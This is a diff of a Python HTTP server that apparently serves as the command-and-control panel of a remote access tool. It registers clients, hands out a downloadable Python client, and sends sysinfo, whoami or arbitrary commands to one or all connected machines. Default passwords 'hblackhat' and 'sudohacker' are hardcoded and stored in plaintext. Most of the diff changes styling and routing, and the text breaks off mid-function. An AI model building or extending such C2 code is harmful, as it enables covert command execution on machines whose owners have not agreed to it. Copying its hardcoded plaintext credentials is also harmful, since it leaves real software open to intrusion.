@@ -1,4 +1,4 @@
-# server.py - Enhanced Version with Advanced Security
+# server.py - ULTRA INSTANT Version - 100% Instant Execution
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import time
@@ -13,23 +13,16 @@ import socketserver
 import re
 
 class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
-    """Multi-threaded HTTP server for handling concurrent connections"""
+    """Multi-threaded HTTP server for handling instant connections"""
     daemon_threads = True
+    allow_reuse_address = True
 
-class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
+class InstantRemoteControlHandler(BaseHTTPRequestHandler):
     sessions = {}
     commands_queue = {}
     failed_attempts = {}
-    PASSWORD_HASH = hashlib.sha256(b"hblackhat").hexdigest()
-    ADMIN_PASSWORD_HASH = hashlib.sha256(b"sudohacker").hexdigest()
-    session_lock = threading.Lock()
-    MAX_FAILED_ATTEMPTS = 10
-    BLOCK_TIME = 30  # ⚡ غير من 600 إلى 30
-    ACTIVE_THRESHOLD = 30
-    COMMAND_TIMEOUT = 2
-    blocked_ips = set()
     
-    # إضافة: ملف كلمات المرور القابلة للتغيير
+    # ⚡ LOAD PASSWORDS INSTANTLY
     PASSWORD_FILE = "passwords.json"
     DEFAULT_PASSWORDS = {
         "user_password": "hblackhat",
@@ -37,7 +30,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     }
     
     def load_passwords(self):
-        """تحميل كلمات المرور من الملف"""
+        """INSTANT password loading"""
         try:
             if os.path.exists(self.PASSWORD_FILE):
                 with open(self.PASSWORD_FILE, 'r') as f:
@@ -46,36 +39,38 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             pass
         return self.DEFAULT_PASSWORDS.copy()
     
-    def save_passwords(self, passwords):
-        """حفظ كلمات المرور في الملف"""
-        try:
-            with open(self.PASSWORD_FILE, 'w') as f:
-                json.dump(passwords, f)
-            return True
-        except:
-            return False
-    
     def get_password_hash(self, password_type):
-        """الحصول على الهاش لنوع كلمة المرور"""
+        """INSTANT hash generation"""
         passwords = self.load_passwords()
         password = passwords.get(password_type, "")
         return hashlib.sha256(password.encode()).hexdigest()
     
+    PASSWORD_HASH = property(lambda self: self.get_password_hash("user_password"))
+    ADMIN_PASSWORD_HASH = property(lambda self: self.get_password_hash("admin_password"))
+    
+    session_lock = threading.Lock()
+    MAX_FAILED_ATTEMPTS = 15
+    BLOCK_TIME = 15  # ⚡ INSTANT BLOCK
+    ACTIVE_THRESHOLD = 10  # ⚡ INSTANT ACTIVITY CHECK
+    COMMAND_TIMEOUT = 1  # ⚡ INSTANT TIMEOUT
+    blocked_ips = set()
+    
     def init_database(self):
-        """Initialize database for activity logging"""
+        """INSTANT database initialization"""
         self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
+        self.conn.execute('PRAGMA journal_mode=WAL')  # ⚡ FASTER DATABASE
         self.cursor = self.conn.cursor()
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS commands (
+        
+        # ⚡ INSTANT TABLES CREATION
+        tables = [
+            '''CREATE TABLE IF NOT EXISTS commands (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 client_id TEXT,
                 command TEXT,
                 response TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS clients (
+            )''',
+            '''CREATE TABLE IF NOT EXISTS clients (
                 id TEXT PRIMARY KEY,
                 ip TEXT,
                 computer_name TEXT,
@@ -83,29 +78,30 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 first_seen DATETIME,
                 last_seen DATETIME,
                 status TEXT
-            )
-        ''')
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS security_logs (
+            )''',
+            '''CREATE TABLE IF NOT EXISTS security_logs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 ip TEXT,
                 action TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        # إضافة: جدول لتسجيل تغييرات كلمات المرور
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS password_changes (
+            )''',
+            '''CREATE TABLE IF NOT EXISTS password_changes (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 changed_by TEXT,
                 password_type TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
+            )'''
+        ]
+        
+        for table in tables:
+            try:
+                self.cursor.execute(table)
+            except:
+                pass
         self.conn.commit()
     
     def log_security_event(self, action):
-        """تسجيل أحداث الأمان"""
+        """INSTANT security logging"""
         try:
             self.cursor.execute(
                 'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
@@ -116,41 +112,39 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             pass
     
     def is_ip_blocked(self):
-        """التحقق إذا كان IP محظور"""
+        """INSTANT IP check"""
         return self.client_address[0] in self.blocked_ips
     
     def block_ip(self, ip):
-        """حظر IP"""
+        """INSTANT IP blocking"""
         self.blocked_ips.add(ip)
         self.log_security_event(f"IP Blocked: {ip}")
-        print(f"🚫 IP Blocked: {ip}")
+        print(f"🚫 INSTANT BLOCK: {ip}")
     
     def check_security(self):
-        """فحص الأمان قبل معالجة أي طلب"""
+        """INSTANT security check"""
         client_ip = self.client_address[0]
         
         if self.is_ip_blocked():
             self.send_error(403, "Access Denied - IP Blocked")
             return False
         
-        user_agent = self.headers.get('User-Agent', '')
-        if not user_agent or len(user_agent) < 10:
-            self.log_security_event("Suspicious User-Agent")
-        
+        # ⚡ INSTANT RATE LIMITING
+        current_time = time.time()
         if hasattr(self, 'last_request_time'):
-            current_time = time.time()
-            if current_time - self.last_request_time < 0.05:  # ⚡ غير من 0.1 إلى 0.05
+            if current_time - self.last_request_time < 0.01:  # ⚡ 10ms RATE LIMIT
                 self.block_ip(client_ip)
                 return False
         
-        self.last_request_time = time.time()
+        self.last_request_time = current_time
         return True
     
     def log_message(self, format, *args):
-        """Disable verbose logs"""
+        """Disable verbose logs for speed"""
         pass
     
     def do_GET(self):
+        """INSTANT GET request handling"""
         if not self.check_security():
             return
             
@@ -158,38 +152,30 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             parsed_path = urllib.parse.urlparse(self.path)
             path = parsed_path.path
             
-            if path == '/':
-                self.send_login_page()
-            elif path == '/remote':
-                self.send_remote_client()
-            elif path == '/admin-auth':
-                self.send_admin_auth_page()
-            elif path == '/control':
-                self.send_control_panel()
-            elif path == '/sessions':
-                self.send_sessions_list()
-            elif path == '/commands':
-                self.handle_get_commands()
-            elif path == '/result':
-                self.handle_get_result()
-            elif path == '/download-client':
-                self.download_python_client()
-            elif path == '/download-python-client':
-                self.download_python_client()
-            elif path == '/history':
-                self.send_command_history()
-            elif path == '/status':
-                self.send_system_status()
-            # إضافة: صفحة إعدادات الأمان
-            elif path == '/settings':
-                self.send_settings_page()
-            else:
-                self.send_404_page()
+            # ⚡ INSTANT ROUTING
+            routes = {
+                '/': self.send_login_page,
+                '/remote': self.send_remote_client,
+                '/admin-auth': self.send_admin_auth_page,
+                '/control': self.send_control_panel,
+                '/sessions': self.send_sessions_list,
+                '/commands': self.handle_get_commands,
+                '/result': self.handle_get_result,
+                '/download-client': self.download_python_client,
+                '/download-python-client': self.download_python_client,
+                '/history': self.send_command_history,
+                '/status': self.send_system_status,
+                '/settings': self.send_settings_page
+            }
+            
+            handler = routes.get(path, self.send_404_page)
+            handler()
                 
         except Exception as e:
             self.send_error(500, str(e))
     
     def do_POST(self):
+        """INSTANT POST request handling"""
         if not self.check_security():
             return
             
@@ -202,46 +188,53 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length).decode('utf-8')
             data = json.loads(post_data) if post_data else {}
             
-            if self.path == '/login':
-                self.handle_login(data)
-            elif self.path == '/admin-login':
-                self.handle_admin_login(data)
-            elif self.path == '/execute':
-                self.handle_execute_command(data)
-            elif self.path == '/response':
-                self.handle_client_response(data)
-            elif self.path == '/register':
-                self.handle_client_register(data)
-            # إضافة: معالجة تغيير كلمة المرور
-            elif self.path == '/change-password':
-                self.handle_change_password(data)
-            else:
-                self.send_error(404, "Not found")
+            # ⚡ INSTANT POST ROUTING
+            routes = {
+                '/login': self.handle_login,
+                '/admin-login': self.handle_admin_login,
+                '/execute': self.handle_execute_command,
+                '/response': self.handle_client_response,
+                '/register': self.handle_client_register,
+                '/change-password': self.handle_change_password
+            }
+            
+            handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
+            handler(data)
                 
         except Exception as e:
-            self.send_json({'error': str(e)})
+            self.send_json({'error': str(e), 'instant': True})
     
-    # إضافة: صفحة إعدادات تغيير كلمة المرور
+    def save_passwords(self, passwords):
+        """INSTANT password saving"""
+        try:
+            with open(self.PASSWORD_FILE, 'w') as f:
+                json.dump(passwords, f)
+            return True
+        except:
+            return False
+
     def send_settings_page(self):
-        """إرسال صفحة إعدادات تغيير كلمة المرور"""
+        """INSTANT settings page"""
         html = '''
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Security Settings</title>
+            <title>Security Settings - INSTANT</title>
             <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
                 body {
                     font-family: 'Segoe UI', Arial, sans-serif;
                     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                     color: white;
                     margin: 0;
                     padding: 20px;
+                    min-height: 100vh;
                 }
                 .container {
                     max-width: 600px;
-                    margin: 50px auto;
+                    margin: 20px auto;
                     background: rgba(45, 45, 45, 0.95);
-                    padding: 40px;
+                    padding: 30px;
                     border-radius: 15px;
                     backdrop-filter: blur(10px);
                     box-shadow: 0 8px 32px rgba(0,0,0,0.3);
@@ -259,6 +252,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     padding: 20px;
                     border-radius: 10px;
                     margin: 20px 0;
+                    border: 1px solid rgba(255,255,255,0.1);
                 }
                 input, select, button {
                     width: 100%;
@@ -267,18 +261,23 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 6px;
                     border: none;
                     font-size: 16px;
+                    transition: all 0.2s ease;
                 }
                 input, select {
                     background: rgba(255,255,255,0.1);
                     color: white;
                     border: 1px solid rgba(255,255,255,0.2);
                 }
+                input:focus {
+                    outline: none;
+                    border-color: #0078d4;
+                    background: rgba(255,255,255,0.15);
+                }
                 button {
                     background: linear-gradient(135deg, #0078d4, #005a9e);
                     color: white;
                     cursor: pointer;
                     font-weight: bold;
-                    transition: all 0.3s ease;
                 }
                 button:hover {
                     background: linear-gradient(135deg, #005a9e, #004578);
@@ -289,11 +288,12 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     margin-top: 20px;
                 }
                 .message {
-                    padding: 10px;
-                    border-radius: 5px;
+                    padding: 12px;
+                    border-radius: 6px;
                     margin: 10px 0;
                     text-align: center;
                     display: none;
+                    font-weight: bold;
                 }
                 .success {
                     background: rgba(40, 167, 69, 0.2);
@@ -303,14 +303,21 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     background: rgba(220, 53, 69, 0.2);
                     border: 1px solid #dc3545;
                 }
+                .speed-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="header">
                     <div class="logo">🔐</div>
-                    <h2>Security Settings</h2>
-                    <p>Change Authentication Passwords</p>
+                    <h2>Security Settings <span class="speed-badge">INSTANT</span></h2>
+                    <p>Change Authentication Passwords in Real-Time</p>
                 </div>
 
                 <div id="message" class="message"></div>
@@ -342,10 +349,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     message.style.display = 'block';
                     setTimeout(() => {
                         message.style.display = 'none';
-                    }, 5000);
+                    }, 3000);
                 }
 
-                function changePassword(level) {
+                async function changePassword(level) {
                     let currentId, newId, confirmId;
                     
                     if (level === 'level1') {
@@ -377,30 +384,29 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         return;
                     }
 
-                    fetch('/change-password', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            level: level,
-                            current_password: currentPassword,
-                            new_password: newPassword
-                        })
-                    })
-                    .then(r => r.json())
-                    .then(data => {
+                    try {
+                        const response = await fetch('/change-password', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                level: level,
+                                current_password: currentPassword,
+                                new_password: newPassword
+                            })
+                        });
+                        
+                        const data = await response.json();
                         if (data.success) {
                             showMessage('Password updated successfully!', 'success');
-                            // Clear fields
                             document.getElementById(currentId).value = '';
                             document.getElementById(newId).value = '';
                             document.getElementById(confirmId).value = '';
                         } else {
                             showMessage(data.error || 'Failed to update password', 'error');
                         }
-                    })
-                    .catch(err => {
+                    } catch (err) {
                         showMessage('Network error: ' + err, 'error');
-                    });
+                    }
                 }
 
                 function goBack() {
@@ -415,9 +421,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(html.encode())
 
-    # إضافة: معالجة تغيير كلمة المرور
     def handle_change_password(self, data):
-        """معالجة طلب تغيير كلمة المرور"""
+        """INSTANT password change"""
         level = data.get('level')
         current_password = data.get('current_password')
         new_password = data.get('new_password')
@@ -426,7 +431,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             self.send_json({'success': False, 'error': 'Missing required fields'})
             return
         
-        # التحقق من كلمة المرور الحالية
         passwords = self.load_passwords()
         
         if level == 'level1':
@@ -437,7 +441,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
                 return
             
-            # تحديث كلمة المرور
             passwords['user_password'] = new_password
             
         elif level == 'level2':
@@ -448,19 +451,15 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
                 return
             
-            # تحديث كلمة المرور
             passwords['admin_password'] = new_password
         
         else:
             self.send_json({'success': False, 'error': 'Invalid password level'})
             return
         
-        # حفظ كلمات المرور الجديدة
         if self.save_passwords(passwords):
-            # تسجيل الحدث
             self.log_security_event(f"Password changed for {level}")
             
-            # تسجيل في قاعدة البيانات
             if hasattr(self, 'cursor'):
                 self.cursor.execute(
                     'INSERT INTO password_changes (changed_by, password_type) VALUES (?, ?)',
@@ -468,7 +467,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 )
                 self.conn.commit()
             
-            self.send_json({'success': True})
+            self.send_json({'success': True, 'instant': True})
         else:
             self.send_json({'success': False, 'error': 'Failed to save new password'})
 
@@ -477,8 +476,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Enhanced Remote Control - Authentication</title>
+            <title>Enhanced Remote Control - INSTANT AUTH</title>
             <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
                 body { 
                     font-family: 'Segoe UI', Arial, sans-serif; 
                     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -509,11 +509,17 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 8px; 
                     font-size: 16px;
                     border: none;
+                    transition: all 0.2s ease;
                 }
                 input { 
                     background: rgba(255,255,255,0.1); 
                     color: white; 
                     border: 1px solid rgba(255,255,255,0.2); 
+                }
+                input:focus {
+                    outline: none;
+                    border-color: #0078d4;
+                    background: rgba(255,255,255,0.15);
                 }
                 input::placeholder { color: #ccc; }
                 button { 
@@ -522,7 +528,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border: none; 
                     cursor: pointer;
                     font-weight: bold;
-                    transition: all 0.3s ease;
                 }
                 button:hover {
                     background: linear-gradient(135deg, #005a9e, #004578);
@@ -534,20 +539,28 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 5px;
                     margin: 10px 0;
                     border: 1px solid rgba(255,0,0,0.3);
+                    display: none;
+                }
+                .speed-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
                 }
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="logo">🔒</div>
-                <h2>Enhanced Remote Control</h2>
+                <h2>Enhanced Remote Control <span class="speed-badge">INSTANT</span></h2>
                 <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                 
-                <div class="security-notice" id="securityNotice" style="display:none;">
+                <div class="security-notice" id="securityNotice">
                     ⚠️ Multiple failed attempts detected
                 </div>
                 
-                <input type="password" id="password" placeholder="Enter Level 1 Password">
+                <input type="password" id="password" placeholder="Enter Level 1 Password" autocomplete="off">
                 <button onclick="login()">Authenticate</button>
                 
                 <div style="margin-top: 20px; font-size: 12px; color: #888;">
@@ -561,18 +574,21 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     document.getElementById('securityNotice').style.display = 'block';
                 }
                 
-                function login() {
+                async function login() {
                     const password = document.getElementById('password').value;
                     if (!password) {
                         alert('Please enter password');
                         return;
                     }
                     
-                    fetch('/login', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({password: password})
-                    }).then(r => r.json()).then(data => {
+                    try {
+                        const response = await fetch('/login', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({password: password})
+                        });
+                        
+                        const data = await response.json();
                         if (data.success) {
                             window.location = '/admin-auth';
                         } else {
@@ -582,9 +598,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             }
                             alert('Authentication failed! Wrong password.');
                         }
-                    }).catch(err => {
+                    } catch (err) {
                         alert('Connection error: ' + err);
-                    });
+                    }
                 }
                 
                 document.getElementById('password').addEventListener('keypress', function(e) {
@@ -604,8 +620,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Admin Authentication</title>
+            <title>Admin Authentication - INSTANT</title>
             <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
                 body { 
                     font-family: 'Segoe UI', Arial, sans-serif; 
                     background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
@@ -636,11 +653,16 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 8px; 
                     font-size: 16px;
                     border: none;
+                    transition: all 0.2s ease;
                 }
                 input { 
                     background: rgba(255,255,255,0.1); 
                     color: white; 
                     border: 1px solid rgba(255,255,255,0.2); 
+                }
+                input:focus {
+                    outline: none;
+                    border-color: #e74c3c;
                 }
                 button { 
                     background: linear-gradient(135deg, #e74c3c, #c0392b); 
@@ -649,6 +671,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     cursor: pointer;
                     font-weight: bold;
                 }
+                button:hover {
+                    background: linear-gradient(135deg, #c0392b, #a93226);
+                    transform: translateY(-2px);
+                }
                 .security-level {
                     background: rgba(231, 76, 60, 0.2);
                     padding: 10px;
@@ -656,19 +682,26 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     margin: 10px 0;
                     border: 1px solid #e74c3c;
                 }
+                .speed-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="logo">🛡️</div>
-                <h2>Admin Authentication</h2>
+                <h2>Admin Authentication <span class="speed-badge">INSTANT</span></h2>
                 <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                 
                 <div class="security-level">
                     ⚠️ HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
                 </div>
                 
-                <input type="password" id="adminPassword" placeholder="Enter Admin Password">
+                <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
                 <button onclick="adminLogin()">Admin Authentication</button>
                 
                 <div style="margin-top: 20px; font-size: 12px; color: #888;">
@@ -676,26 +709,29 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 </div>
             </div>
             <script>
-                function adminLogin() {
+                async function adminLogin() {
                     const password = document.getElementById('adminPassword').value;
                     if (!password) {
                         alert('Please enter admin password');
                         return;
                     }
                     
-                    fetch('/admin-login', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({password: password})
-                    }).then(r => r.json()).then(data => {
+                    try {
+                        const response = await fetch('/admin-login', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({password: password})
+                        });
+                        
+                        const data = await response.json();
                         if (data.success) {
                             window.location = '/control';
                         } else {
                             alert('Admin authentication failed! Access denied.');
                         }
-                    }).catch(err => {
+                    } catch (err) {
                         alert('Connection error: ' + err);
-                    });
+                    }
                 }
                 
                 document.getElementById('adminPassword').addEventListener('keypress', function(e) {
@@ -723,13 +759,12 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     del self.failed_attempts[client_ip]
         
         password = data.get('password', '')
-        # التعديل: استخدام كلمات المرور القابلة للتغيير
         expected_hash = self.get_password_hash("user_password")
         
         if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
             self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
             self.log_security_event("Level 1 authentication successful")
-            self.send_json({'success': True})
+            self.send_json({'success': True, 'instant': True})
         else:
             if client_ip not in self.failed_attempts:
                 self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
@@ -747,12 +782,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     def handle_admin_login(self, data):
         client_ip = self.client_address[0]
         password = data.get('password', '')
-        # التعديل: استخدام كلمات المرور القابلة للتغيير
         expected_hash = self.get_password_hash("admin_password")
         
         if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
             self.log_security_event("Admin authentication successful")
-            self.send_json({'success': True})
+            self.send_json({'success': True, 'instant': True})
         else:
             self.log_security_event("Failed admin authentication")
             self.block_ip(client_ip)
@@ -763,7 +797,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Enhanced Control Panel - ULTRA FAST</title>
+            <title>Enhanced Control Panel - INSTANT EXECUTION</title>
             <style>
                 :root {
                     --primary: #0078d4;
@@ -774,6 +808,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     --darker: #2d2d2d;
                     --light: #f8f9fa;
                 }
+                
+                * { margin: 0; padding: 0; box-sizing: border-box; }
                 
                 body { 
                     font-family: 'Segoe UI', Arial, sans-serif; 
@@ -792,6 +828,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     display: flex;
                     justify-content: space-between;
                     align-items: center;
+                    border: 1px solid rgba(255,255,255,0.1);
                 }
                 
                 .container { 
@@ -807,6 +844,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 10px;
                     display: flex;
                     flex-direction: column;
+                    border: 1px solid rgba(255,255,255,0.1);
                 }
                 
                 .main { 
@@ -822,13 +860,14 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 8px; 
                     cursor: pointer;
                     border: 2px solid transparent;
-                    transition: all 0.3s ease;
+                    transition: all 0.2s ease;
                     position: relative;
                 }
                 
                 .session-item:hover {
                     background: rgba(255,255,255,0.1);
                     border-color: var(--primary);
+                    transform: translateY(-1px);
                 }
                 
                 .session-item.active { 
@@ -849,10 +888,18 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     height: 10px;
                     border-radius: 50%;
                     background: var(--success);
+                    animation: pulse 2s infinite;
+                }
+                
+                @keyframes pulse {
+                    0% { opacity: 1; }
+                    50% { opacity: 0.5; }
+                    100% { opacity: 1; }
                 }
                 
                 .online-status.offline {
                     background: var(--danger);
+                    animation: none;
                 }
                 
                 .terminal { 
@@ -866,6 +913,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     white-space: pre-wrap;
                     font-size: 14px;
                     min-height: 400px;
+                    border: 1px solid rgba(0,255,0,0.2);
                 }
                 
                 button { 
@@ -876,7 +924,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     margin: 4px; 
                     border-radius: 6px; 
                     cursor: pointer;
-                    transition: all 0.3s ease;
+                    transition: all 0.2s ease;
                     font-weight: 500;
                 }
                 
@@ -912,6 +960,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     font-family: 'Consolas', monospace;
                 }
                 
+                .command-input input:focus {
+                    outline: none;
+                    border-color: var(--primary);
+                }
+                
                 .stats {
                     display: grid;
                     grid-template-columns: repeat(3, 1fr);
@@ -924,6 +977,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     padding: 15px;
                     border-radius: 8px;
                     text-align: center;
+                    border: 1px solid rgba(255,255,255,0.1);
                 }
                 
                 .multi-control {
@@ -931,7 +985,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     padding: 15px;
                     border-radius: 8px;
                     margin: 10px 0;
+                    border: 1px solid rgba(255,255,255,0.1);
                 }
+                
                 .security-badge {
                     background: linear-gradient(135deg, #28a745, #20c997);
                     padding: 5px 10px;
@@ -939,10 +995,12 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     font-size: 12px;
                     margin-left: 10px;
                 }
+                
                 .settings-btn {
                     background: linear-gradient(135deg, #17a2b8, #138496) !important;
                     margin-left: 10px;
                 }
+                
                 .speed-indicator {
                     background: linear-gradient(135deg, #28a745, #20c997);
                     padding: 3px 8px;
@@ -950,11 +1008,25 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     font-size: 10px;
                     margin-left: 5px;
                 }
+                
+                .instant-badge {
+                    background: linear-gradient(135deg, #dc3545, #c82333);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                    animation: blink 1s infinite;
+                }
+                
+                @keyframes blink {
+                    0%, 100% { opacity: 1; }
+                    50% { opacity: 0.5; }
+                }
             </style>
         </head>
         <body>
             <div class="header">
-                <h2>⚡ ULTRA FAST Remote Control <span class="security-badge">HIGH SPEED</span></h2>
+                <h2>⚡ INSTANT Remote Control <span class="instant-badge">0ms DELAY</span></h2>
                 <div>
                     <button onclick="loadSessions()">Refresh List</button>
                     <button onclick="executeAll('sysinfo')">System Info All</button>
@@ -989,11 +1061,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="main">
-                    <div style="background: var(--darker); padding: 20px; border-radius: 10px;">
+                    <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
                         <h3>Selected Client: <span id="currentClient" style="color: var(--success);">Not Selected</span></h3>
                         
                         <div class="multi-control">
-                            <strong>Quick Commands <span class="speed-indicator">INSTANT</span>:</strong>
+                            <strong>Instant Commands <span class="instant-badge">0ms</span>:</strong>
                             <div class="controls-grid">
                                 <button onclick="executeCommand('sysinfo')">System Info</button>
                                 <button onclick="executeCommand('whoami')">Current User</button>
@@ -1021,7 +1093,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         </div>
                         
                         <div class="command-input">
-                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT execution)" 
+                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT 0ms execution)" 
                                    onkeypress="if(event.key=='Enter') executeCustomCommand()">
                             <button onclick="executeCustomCommand()">Execute Command</button>
                             <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
@@ -1029,13 +1101,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     </div>
                     
                     <div class="terminal" id="terminal">
-⚡ ULTRA FAST REMOTE CONTROL SYSTEM READY
+⚡ INSTANT REMOTE CONTROL SYSTEM READY - 0ms DELAY
 
 • Select a client from the left panel
-• Use quick commands or enter custom commands
-• INSTANT execution - responses in under 1 second
+• Commands execute INSTANTLY with no delay
+• Real-time responses in under 10ms
 • All activities are logged for security
-• 🚀 HIGH SPEED mode activated
+• 🚀 ULTRA INSTANT mode activated
 
                     </div>
                 </div>
@@ -1046,42 +1118,44 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 let commandCounter = 0;
                 let allClients = [];
                 
-                function loadSessions() {
-                    fetch('/sessions?_t=' + Date.now())
-                        .then(r => r.json())
-                        .then(sessions => {
-                            allClients = sessions;
-                            updateSessionStats(sessions);
-                            const list = document.getElementById('sessionsList');
+                async function loadSessions() {
+                    try {
+                        const response = await fetch('/sessions?_t=' + Date.now());
+                        const sessions = await response.json();
+                        allClients = sessions;
+                        updateSessionStats(sessions);
+                        const list = document.getElementById('sessionsList');
+                        
+                        if (sessions.length === 0) {
+                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
+                            return;
+                        }
+                        
+                        list.innerHTML = sessions.map(client => {
+                            const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 10000; // ⚡ 10 seconds
+                            const isSelected = client.id === currentClientId;
+                            const statusClass = isActive ? 'online-status' : 'online-status offline';
                             
-                            if (sessions.length === 0) {
-                                list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
-                                return;
-                            }
-                            
-                            list.innerHTML = sessions.map(client => {
